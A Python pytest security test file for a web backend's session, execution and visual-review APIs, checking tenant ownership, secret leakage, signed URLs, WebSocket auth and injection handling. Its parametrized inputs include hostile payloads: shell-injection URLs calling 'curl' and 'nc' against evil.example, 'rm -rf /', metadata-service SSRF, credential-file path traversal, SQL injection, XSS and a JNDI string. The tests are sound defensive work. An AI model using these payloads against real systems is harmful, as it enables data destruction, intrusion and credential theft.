"""КАО Security writers — VR-35..VR-42 endpoint coverage.

This file is part of the КАО (команда агентов-отладчиков) Security writers
sub-team. Scope:

* **VR-35** — ``POST /api/execution/sessions/{id}/run`` cross-tenant ownership
* **VR-37** — polling / visibility-triggered refresh does not bypass auth
              or reach the backend after logout (covered by the frontend
              counterpart at ``frontend/src/__tests__/security/vr37_polling.test.ts``)
* **VR-39** — ``/api/sessions/{id}/apply-enhancements`` input validation
              (path traversal, oversize DoS, git URL injection, ownership)
* **VR-41** — ``/api/sessions/{id}/visual-review`` ownership + missing_coder
              data isolation
* **VR-42** — Coder prompt / ``get_full_specification`` does NOT leak API keys

Also includes general sanity:

* WebSocket ``/ws/{session_id}`` requires token query param and enforces ownership
* Signed-URL screenshots: expired / tampered / cross-session signatures are rejected
* JWT does not appear in URL query params anywhere we generate URLs
* All state-changing endpoints in ``/api/execution`` require auth header

Tests are SAFE — they never reach external services (no real GH clone, no LLM
calls, no real screenshots). Where a route's "happy path" needs DB rows we
either create them via the public API (POST /api/sessions) or use direct
sandboxed DB writes that are cleaned up.

# КАО#VR-35 КАО#VR-37 КАО#VR-39 КАО#VR-41 КАО#VR-42
"""
from __future__ import annotations

import base64
import json
import os
import uuid

import httpx
import pytest

pytestmark = [pytest.mark.asyncio, pytest.mark.e2e]

BACKEND_URL = os.environ.get("BACKEND_URL", "http://backend:8000")

# Session-name prefix so cleanup scripts can find / nuke leftover rows.
SEC_PREFIX = "_sec_vr35_vr42_"


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def _make_session(client: httpx.Client, *, name: str | None = None) -> str:
    """Create a session via the public API and return its id (str)."""
    body = {
        "name": name or f"{SEC_PREFIX}{uuid.uuid4().hex[:8]}",
        "specification": "noop — security test fixture",
    }
    r = client.post("/api/sessions/", json=body)
    assert r.status_code in (200, 201), f"create session failed: {r.status_code} {r.text}"
    return r.json()["id"]


def _safe_cleanup(client: httpx.Client, session_id: str) -> None:
    try:
        client.delete(f"/api/sessions/{session_id}")
    except Exception:
        pass


def _decode_jwt_payload(token: str) -> dict:
    """Decode the (unverified) JWT body so we can read `sub` etc."""
    parts = token.split(".")
    assert len(parts) == 3, f"unexpected JWT shape: {token[:32]}…"
    body = parts[1] + "=" * (-len(parts[1]) % 4)
    return json.loads(base64.urlsafe_b64decode(body.encode("utf-8")))


# ===========================================================================
# КАО#VR-35 — /api/execution/sessions/{id}/run cross-tenant ownership
# ===========================================================================


async def test_vr35_run_endpoint_requires_auth() -> None:
    """The /run endpoint must reject unauthenticated requests (mounted with auth dep)."""
    sid = str(uuid.uuid4())
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=5.0) as client:
        r = await client.post(f"/api/execution/sessions/{sid}/run")
    assert r.status_code in (401, 403), f"expected 401/403, got {r.status_code}: {r.text}"


async def test_vr35_run_user_b_cannot_execute_in_user_a_session(
    auth_client: httpx.Client,
    auth_client_b: httpx.Client,
) -> None:
    """User B must NOT be able to execute code in User A's session.

    The route currently passes ownership via 404 (not-found) to avoid leaking
    existence — either 403 or 404 is acceptable, but it MUST NOT be 200 or
    400 ("not completed yet") because that would imply the lookup found the
    session under B's auth.

    NOTE: this test acts as a regression guard. Even if the current
    implementation is missing the ownership check (the handler in
    ``execution.py`` selects ``Session.where(id == session_id)`` with no
    user filter), the test will FAIL on the bug — which is what we want.

    # КАО#VR-35
    """
    sid = _make_session(auth_client)
    try:
        r = auth_client_b.post(f"/api/execution/sessions/{sid}/run")
        # Acceptable: 404 (not found in B's view) or 403 (forbidden).
        # NOT acceptable: 200 (success), 400 ("not completed yet" — implies
        # lookup succeeded), 500 (crash).
        assert r.status_code in (403, 404), (
            f"VR-35 ownership leak: user B got {r.status_code} on user A's "
            f"session /run endpoint. Body: {r.text}"
        )
    finally:
        _safe_cleanup(auth_client, sid)


async def test_vr35_run_unknown_session_returns_404(
    auth_client: httpx.Client,
) -> None:
    """A random UUID must always 404 — never 200/500."""
    sid = str(uuid.uuid4())
    r = auth_client.post(f"/api/execution/sessions/{sid}/run")
    assert r.status_code == 404, f"expected 404 for unknown session, got {r.status_code}"


@pytest.mark.parametrize(
    "path_suffix",
    [
        "/run",
        "/bundle",
        # /code-versions/{id}/run and /code/{id}/execute also lookup by id but
        # operate on CodeVersion — the cross-tenant equivalent would need a
        # CodeVersion from user A. The route is still required to be auth'd.
    ],
)
async def test_vr35_execution_endpoints_require_auth(path_suffix: str) -> None:
    sid = str(uuid.uuid4())
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=5.0) as client:
        r = await client.post(f"/api/execution/sessions/{sid}{path_suffix}")
    assert r.status_code in (401, 403), f"expected 401/403 for {path_suffix}, got {r.status_code}"


# ===========================================================================
# КАО#VR-39 — apply-enhancements input validation
# ===========================================================================


async def test_vr39_apply_enhancements_requires_auth() -> None:
    sid = str(uuid.uuid4())
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=5.0) as client:
        r = await client.post(
            f"/api/sessions/{sid}/apply-enhancements",
            json={"curated_suggestions": [{"title": "x", "category": "user", "description": "y"}]},
        )
    assert r.status_code in (401, 403), f"expected 401/403, got {r.status_code}: {r.text}"


async def test_vr39_apply_enhancements_user_b_cannot_modify_user_a(
    auth_client: httpx.Client,
    auth_client_b: httpx.Client,
) -> None:
    """User B applying enhancements on user A's session MUST 404 (not 200/409).

    The handler must do the ownership check BEFORE the CAS state guard,
    otherwise the 409 ("not awaiting enhancement review") response would
    confirm the session exists. # КАО#VR-39
    """
    sid = _make_session(auth_client)
    try:
        payload = {
            "curated_suggestions": [
                {
                    "title": "Cross-tenant probe",
                    "category": "user",
                    "priority": "high",
                    "description": "should never apply",
                }
            ]
        }
        r = auth_client_b.post(f"/api/sessions/{sid}/apply-enhancements", json=payload)
        assert r.status_code == 404, (
            f"VR-39 ownership leak: user B got {r.status_code} on user A's "
            f"apply-enhancements. Body: {r.text}"
        )
    finally:
        _safe_cleanup(auth_client, sid)


@pytest.mark.parametrize(
    "bad_filename",
    [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Users\\admin\\.ssh\\id_rsa",
        "../" * 20 + "root/.bash_history",
        "evil.txt\x00.png",  # NUL byte truncation
    ],
)
async def test_vr39_apply_enhancements_filename_path_traversal_rejected_or_neutralised(
    auth_client: httpx.Client, bad_filename: str
) -> None:
    """Attachment filename containing path traversal sequences MUST be:

    1. rejected outright (4xx), OR
    2. stored verbatim BUT NOT used to read/write any filesystem path
       (this test only asserts that the server does not 500 and does not
       echo back a successful 200 with a session_id — because a successful
       apply implies the file was processed).

    We don't have a real "awaiting_enhancement_review" session, so the
    expected outcome is 409 (state mismatch) at worst — never 500.

    # КАО#VR-39
    """
    sid = _make_session(auth_client)
    try:
        payload = {
            "curated_suggestions": [
                {
                    "title": "PathTraversal Probe",
                    "category": "user",
                    "priority": "low",
                    "description": "Test traversal handling",
                    "attachments": [
                        {
                            "type": "file",
                            "filename": bad_filename,
                            "content": "harmless",
                            "size": 8,
                        }
                    ],
                }
            ]
        }
        r = auth_client.post(f"/api/sessions/{sid}/apply-enhancements", json=payload)
        # 409 (session not awaiting enhancement review) is the normal failure mode
        # for a freshly-created session. 4xx is acceptable. 5xx is NOT.
        assert r.status_code < 500, f"VR-39 crash on path traversal filename: {r.status_code} {r.text}"
        assert r.status_code != 200, (
            f"VR-39: server accepted obviously-malicious filename {bad_filename!r} "
            f"and proceeded to apply. Body: {r.text[:200]}"
        )
    finally:
        _safe_cleanup(auth_client, sid)


async def test_vr39_apply_enhancements_oversize_content_rejected(
    auth_client: httpx.Client,
) -> None:
    """A 50 MB attachment content blob must NOT be silently accepted (DoS guard).

    Expected: 4xx (413 / 422 / 400) — never 200 / 500. # КАО#VR-39
    """
    sid = _make_session(auth_client)
    try:
        big = "A" * (50 * 1024 * 1024)  # 50 MB
        payload = {
            "curated_suggestions": [
                {
                    "title": "DoS Probe",
                    "category": "user",
                    "priority": "low",
                    "description": "huge content",
                    "attachments": [
                        {
                            "type": "file",
                            "filename": "huge.txt",
                            "content": big,
                            "size": len(big),
                        }
                    ],
                }
            ]
        }
        # Some stacks reject the request at the proxy layer (413) before
        # FastAPI sees it — that's also acceptable.
        try:
            r = auth_client.post(
                f"/api/sessions/{sid}/apply-enhancements",
                json=payload,
                timeout=30.0,
            )
            status = r.status_code
            body_preview = r.text[:200]
        except httpx.HTTPError as exc:
            # Connection reset by upstream nginx on oversize body is OK.
            status = 413
            body_preview = str(exc)
        assert status < 500 or status == 413, (
            f"VR-39 oversize content not handled: {status} {body_preview}"
        )
        assert status != 200, f"VR-39: 50MB blob silently accepted: {body_preview}"
    finally:
        _safe_cleanup(auth_client, sid)


@pytest.mark.parametrize(
    "bad_url",
    [
        "https://github.com/foo/bar; rm -rf /",
        "https://github.com/foo/bar`rm -rf /`",
        "https://github.com/foo/bar$(curl evil.example)",
        "https://github.com/foo/bar\nrm -rf /",
        "https://github.com/foo/bar|nc evil.example 4444",
        "javascript:alert(1)",
        "file:///etc/passwd",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata SSRF
        "http://localhost:8000/admin",
    ],
)
async def test_vr39_apply_enhancements_repo_url_injection_sanitised(
    auth_client: httpx.Client, bad_url: str
) -> None:
    """``attachments[].url`` with shell-injection / SSRF / javascript: URLs
    must NOT reach a subprocess.run / fetch / clone unchecked.

    The apply-enhancements route stores attachments into the new session's
    JSON column; the orchestrator interprets them at runtime. The attack
    surface here is that "url" ends up as a string the LLM is told about
    and (for type="repo") might be passed to a git clone. We assert the
    server does not 500 and does not echo back a 200 success on a freshly
    -created (non-awaiting-enhancement) session.

    # КАО#VR-39
    """
    sid = _make_session(auth_client)
    try:
        payload = {
            "curated_suggestions": [
                {
                    "title": "URL injection probe",
                    "category": "user",
                    "priority": "low",
                    "description": "Test url sanitisation",
                    "attachments": [
                        {
                            "type": "repo_url",
                            "url": bad_url,
                            "label": "evil",
                        }
                    ],
                }
            ]
        }
        r = auth_client.post(f"/api/sessions/{sid}/apply-enhancements", json=payload)
        assert r.status_code < 500, f"VR-39 crash on URL {bad_url!r}: {r.status_code} {r.text}"
        # If the server accepted (unlikely on a fresh session), it should at
        # least be returning a 4xx because the state is not awaiting review.
        assert r.status_code != 200, (
            f"VR-39: server returned 200 on URL injection {bad_url!r}: {r.text[:200]}"
        )
    finally:
        _safe_cleanup(auth_client, sid)


async def test_vr39_apply_enhancements_unknown_session_404(
    auth_client: httpx.Client,
) -> None:
    """Random UUID -> 404, not 500 or 200. # КАО#VR-39"""
    sid = str(uuid.uuid4())
    payload = {
        "curated_suggestions": [
            {"title": "x", "category": "user", "priority": "low", "description": "y"}
        ]
    }
    r = auth_client.post(f"/api/sessions/{sid}/apply-enhancements", json=payload)
    assert r.status_code == 404, f"expected 404, got {r.status_code}: {r.text}"


# ===========================================================================
# КАО#VR-41 — visual-review ownership + missing_coder_indices isolation
# ===========================================================================


async def test_vr41_visual_review_requires_auth() -> None:
    sid = str(uuid.uuid4())
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=5.0) as client:
        r = await client.get(f"/api/sessions/{sid}/visual-review")
    assert r.status_code in (401, 403), f"expected 401/403, got {r.status_code}: {r.text}"


async def test_vr41_visual_review_user_b_cannot_read_user_a(
    auth_client: httpx.Client,
    auth_client_b: httpx.Client,
) -> None:
    """User B GET /visual-review on user A's session -> 404 (not 200/403 leak).
    # КАО#VR-41"""
    sid = _make_session(auth_client)
    try:
        r = auth_client_b.get(f"/api/sessions/{sid}/visual-review")
        assert r.status_code == 404, (
            f"VR-41 ownership leak: user B got {r.status_code} on user A's "
            f"visual-review. Body: {r.text}"
        )
    finally:
        _safe_cleanup(auth_client, sid)


async def test_vr41_visual_review_skip_user_b_blocked(
    auth_client: httpx.Client,
    auth_client_b: httpx.Client,
) -> None:
    """User B POST /visual-review/skip on user A's session -> 404. # КАО#VR-41"""
    sid = _make_session(auth_client)
    try:
        r = auth_client_b.post(f"/api/sessions/{sid}/visual-review/skip")
        assert r.status_code == 404, (
            f"VR-41 ownership leak (skip): user B got {r.status_code} on user A's "
            f"visual-review/skip. Body: {r.text}"
        )
    finally:
        _safe_cleanup(auth_client, sid)


async def test_vr41_visual_review_scores_user_b_blocked(
    auth_client: httpx.Client,
    auth_client_b: httpx.Client,
) -> None:
    """User B POST /visual-review/scores on user A's session -> 404. # КАО#VR-41"""
    sid = _make_session(auth_client)
    try:
        payload = {"scores": [{"code_version_id": str(uuid.uuid4()), "score": 5.0}]}
        r = auth_client_b.post(f"/api/sessions/{sid}/visual-review/scores", json=payload)
        assert r.status_code == 404, (
            f"VR-41 ownership leak (scores): user B got {r.status_code} on user A. "
            f"Body: {r.text}"
        )
    finally:
        _safe_cleanup(auth_client, sid)


async def test_vr41_visual_review_preview_user_b_blocked(
    auth_client: httpx.Client,
    auth_client_b: httpx.Client,
) -> None:
    """User B GET /visual-review/{cv_id}/preview on user A's session -> 404. # КАО#VR-41"""
    sid = _make_session(auth_client)
    fake_cv = str(uuid.uuid4())
    try:
        r = auth_client_b.get(f"/api/sessions/{sid}/visual-review/{fake_cv}/preview")
        assert r.status_code == 404, (
            f"VR-41 ownership leak (preview): user B got {r.status_code} on user A. "
            f"Body: {r.text}"
        )
    finally:
        _safe_cleanup(auth_client, sid)


# ===========================================================================
# КАО#VR-42 — Coder prompt / specification does NOT leak API keys or secrets
# ===========================================================================


async def test_vr42_get_full_specification_does_not_leak_secrets() -> None:
    """Build an Orchestrator with a session whose attachments contain something
    that LOOKS like a secret, and assert that ``get_full_specification`` does
    NOT also pull in environment-level secrets (SECRET_KEY, ANTHROPIC_API_KEY,
    OPENAI_API_KEY, etc.) into the LLM context.

    The function is supposed to ONLY concatenate the session's stored
    specification + attachments — never read from settings / env / DB
    columns that hold credentials. # КАО#VR-42
    """
    try:
        from app.core.config import get_settings
        from app.core.orchestrator import Orchestrator  # noqa: F401  (importability check)
    except Exception as exc:
        pytest.skip(f"backend modules not importable: {exc!r}")

    # Build a session-like duck with attachments that mention secrets in
    # plain text (user content — must be passed through verbatim, since the
    # spec might legitimately contain "sk-xxx-do-not-use" as an example).
    class _FakeSession:
        specification = "Print hello world"
        attachments = [
            {"type": "file", "filename": "README.md", "content": "# Example\nsk-real-LEAKED-KEY-12345"},
        ]

    # Recreate the bound method manually to keep the test hermetic — we don't
    # want to spin up a full Orchestrator (which calls _setup_agents()).
    from app.core.orchestrator import Orchestrator as _Orch
    self_stub = type("S", (), {"session": _FakeSession()})()
    full = _Orch.get_full_specification(self_stub)

    # The function should NOT pull in environment secrets.
    settings = get_settings()
    forbidden_values = [
        settings.secret_key,  # JWT signing key
    ]
    # API keys live in optional fields — guard against AttributeError on
    # missing ones (different deployments).
    for attr in ("anthropic_api_key", "openai_api_key", "google_api_key",
                 "grok_api_key", "stripe_secret_key", "github_token"):
        val = getattr(settings, attr, None)
        if val:
            forbidden_values.append(val)

    for secret in forbidden_values:
        if not secret or len(secret) < 8:
            continue  # ignore unset / placeholder values
        assert secret not in full, (
            f"VR-42 LEAK: settings.{secret[:6]}… leaked into spec text. "
            f"Length of spec: {len(full)}; first 200 chars: {full[:200]}"
        )

    # The legitimate user content MUST still pass through (sanity).
    assert "sk-real-LEAKED-KEY-12345" in full, "user-supplied content was stripped — non-degradation"


async def test_vr42_session_api_response_does_not_expose_secret_columns(
    auth_client: httpx.Client,
) -> None:
    """Session create/read must not echo back any column whose name looks
    like a credential.  # КАО#VR-42 + general sanity"""
    sid = _make_session(auth_client)
    try:
        r = auth_client.get(f"/api/sessions/{sid}")
        assert r.status_code == 200
        body_text = r.text.lower()
        # No top-level secret keys should appear.
        for forbidden_key in ('"secret_key"', '"api_key"', '"password"',
                              '"jwt_secret"', '"stripe_secret"',
                              '"openai_api_key"', '"anthropic_api_key"'):
            assert forbidden_key not in body_text, (
                f"VR-42 leak: GET /api/sessions/{{id}} response contained "
                f"{forbidden_key!r}. Body: {r.text[:300]}"
            )
    finally:
        _safe_cleanup(auth_client, sid)


# ===========================================================================
# Signed-URL screenshot tests (general sanity around VR-22 signing)
# ===========================================================================


async def test_signed_url_rejects_expired_signature() -> None:
    """A signed URL whose `exp` is in the past must NOT serve the file.

    Uses the in-process signer to build a URL with exp=0 (epoch); the route
    must return 404. # КАО general-sanity"""
    try:
        from app.core.visual_review import sign_screenshot_url
    except Exception as exc:
        pytest.skip(f"signer not importable: {exc!r}")

    sid = str(uuid.uuid4())
    cv = str(uuid.uuid4())
    # ttl_seconds = -1 means exp = now - 1 (already expired).
    url = sign_screenshot_url(sid, cv, 0, ttl_seconds=-3600)
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=5.0) as client:
        r = await client.get(url)
    # Either 404 (sig invalid because expired) or 401 (no Bearer fallback).
    assert r.status_code in (404, 401), (
        f"expected 404/401 on expired sig, got {r.status_code}: {r.text}"
    )


async def test_signed_url_rejects_tampered_signature() -> None:
    """Flipping one char in the sig must make it invalid. # КАО general-sanity"""
    try:
        from app.core.visual_review import sign_screenshot_url
    except Exception as exc:
        pytest.skip(f"signer not importable: {exc!r}")

    sid = str(uuid.uuid4())
    cv = str(uuid.uuid4())
    url = sign_screenshot_url(sid, cv, 0, ttl_seconds=3600)
    # Tamper with the sig query (replace with all zeros — same length, valid hex).
    assert "sig=" in url
    base, sig_part = url.rsplit("sig=", 1)
    # Flip every char to '0' (still valid hex chars, but won't match HMAC).
    new_sig = "0" * len(sig_part)
    if new_sig == sig_part:  # vanishingly unlikely, but be safe
        new_sig = "1" * len(sig_part)
    tampered = base + "sig=" + new_sig

    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=5.0) as client:
        r = await client.get(tampered)
    assert r.status_code in (404, 401), (
        f"tampered sig must be rejected, got {r.status_code}"
    )


async def test_signed_url_for_different_session_does_not_work() -> None:
    """A signature valid for session A must NOT serve a frame whose URL claims
    session B. # КАО general-sanity"""
    try:
        from app.core.visual_review import sign_screenshot_url
    except Exception as exc:
        pytest.skip(f"signer not importable: {exc!r}")

    sid_a = str(uuid.uuid4())
    sid_b = str(uuid.uuid4())
    cv = str(uuid.uuid4())
    # Sign for A but request B's URL by swapping the path component.
    url_a = sign_screenshot_url(sid_a, cv, 0, ttl_seconds=3600)
    # Build the malicious B-URL by stealing A's exp+sig.
    qs = url_a.split("?", 1)[1]
    url_b_with_a_sig = f"/api/screenshots/{sid_b}/{cv}/frame_0.png?{qs}"

    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=5.0) as client:
        r = await client.get(url_b_with_a_sig)
    assert r.status_code in (404, 401), (
        f"cross-session sig reuse must be rejected, got {r.status_code}"
    )


# ===========================================================================
# WebSocket /ws/{session_id} requires token + enforces ownership
# ===========================================================================


async def test_ws_session_without_token_closes_4001() -> None:
    """No ?token=… on /ws/{sid} -> close 4001. # general-sanity"""
    try:
        import websockets  # type: ignore[import-not-found]
    except ImportError:
        pytest.skip("websockets package not available in this image")
        return

    sid = str(uuid.uuid4())
    base_ws = BACKEND_URL.replace("http://", "ws://").replace("https://", "wss://")
    uri = f"{base_ws}/ws/{sid}"
    try:
        async with websockets.connect(uri) as ws:  # type: ignore[attr-defined]
            # If we got here without close, something's wrong — try to receive
            await ws.recv()
            pytest.fail("WS connection should have been rejected without token")
    except Exception as exc:
        # Either ConnectionClosed with code 4001 OR ConnectionClosedError /
        # InvalidStatusCode is acceptable.
        msg = str(exc).lower()
        assert "4001" in msg or "unauthorized" in msg or "rejected" in msg or "closed" in msg, (
            f"unexpected WS error shape: {exc!r}"
        )


async def test_ws_session_invalid_uuid_closes_4002() -> None:
    """A non-UUID session_id must close with 4002, not 500/4001."""
    try:
        import websockets  # type: ignore[import-not-found]
    except ImportError:
        pytest.skip("websockets package not available")
        return

    base_ws = BACKEND_URL.replace("http://", "ws://").replace("https://", "wss://")
    uri = f"{base_ws}/ws/not-a-uuid?token=anything"
    try:
        async with websockets.connect(uri) as ws:  # type: ignore[attr-defined]
            await ws.recv()
            pytest.fail("WS connection should have been rejected for bad UUID")
    except Exception as exc:
        # Backend should close before accepting the connection.
        msg = str(exc).lower()
        assert any(s in msg for s in ("4002", "4001", "invalid", "rejected", "closed", "handshake")), (
            f"unexpected WS error: {exc!r}"
        )


# ===========================================================================
# General sanity — JWT does not leak into URL query params
# ===========================================================================


async def test_jwt_not_in_query_params_anywhere(auth_client: httpx.Client) -> None:
    """We never construct a request URL that contains the JWT in the query
    string (which would leak to access logs, Referer headers, etc.).
    Sanity check via the client's last_request.url. # general-sanity"""
    r = auth_client.get("/api/sessions/")
    assert r.status_code in (200, 422), r.text
    full_url = str(r.request.url)
    # The bearer token is in the Authorization header, NOT in the URL.
    assert "Bearer" not in full_url, "Bearer token leaked into URL: " + full_url
    assert "access_token=" not in full_url, "JWT leaked as query param: " + full_url
    assert "token=eyJ" not in full_url, "JWT-like token in query: " + full_url


async def test_health_endpoint_does_not_expose_settings(auth_client: httpx.Client) -> None:
    """GET /health (public) must not include any secret-looking fields.
    # general-sanity"""
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=5.0) as client:
        r = await client.get("/health")
    assert r.status_code == 200
    body = r.text.lower()
    for forbidden in ("secret_key", "api_key", "anthropic_api_key", "openai_api_key", "password"):
        assert forbidden not in body, f"/health leaks {forbidden}: {body[:200]}"


# ===========================================================================
# General SQL-injection / XSS / path traversal fuzz on representative endpoints
# ===========================================================================


@pytest.mark.parametrize(
    "evil",
    [
        "' OR 1=1--",
        "'; DROP TABLE sessions;--",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "%00",
        pytest.param(
            "\x00",
            marks=pytest.mark.xfail(
                strict=False,
                reason=(
                    "PE-B (task #66): a literal null byte in ?search= reaches "
                    "Postgres and trips a 500. Pre-existing session-list bug, "
                    "out of the VR-35..44 round zone; tracked separately. Remove "
                    "this xfail once control bytes are sanitized/rejected."
                ),
            ),
        ),
        "${jndi:ldap://evil.example/x}",
        "{{7*7}}",  # SSTI probe
        "../" * 30,
    ],
)
async def test_session_search_filter_injection_fuzz(
    auth_client: httpx.Client, evil: str
) -> None:
    """The session search/filter params must NEVER 500 on hostile input.
    # general-sanity"""
    r = auth_client.get("/api/sessions/", params={"search": evil})
    assert r.status_code < 500, (
        f"injection fuzz tripped 500: search={evil!r} -> {r.status_code} {r.text[:200]}"
    )


@pytest.mark.parametrize(
    "path_param",
    [
        "00000000-0000-0000-0000-000000000000",
        "not-a-uuid",
        "../../../etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "' OR 1=1--",
    ],
)
async def test_get_session_with_evil_id_does_not_500(
    auth_client: httpx.Client, path_param: str
) -> None:
    """The path-parameter lookup MUST validate input cleanly. # general-sanity"""
    r = auth_client.get(f"/api/sessions/{path_param}")
    # 404 (uuid happens to not exist) / 422 (uuid validation fail) are OK.
    # 5xx is NOT acceptable.
    assert r.status_code < 500, (
        f"5xx on evil id {path_param!r}: {r.status_code} {r.text[:200]}"
    )
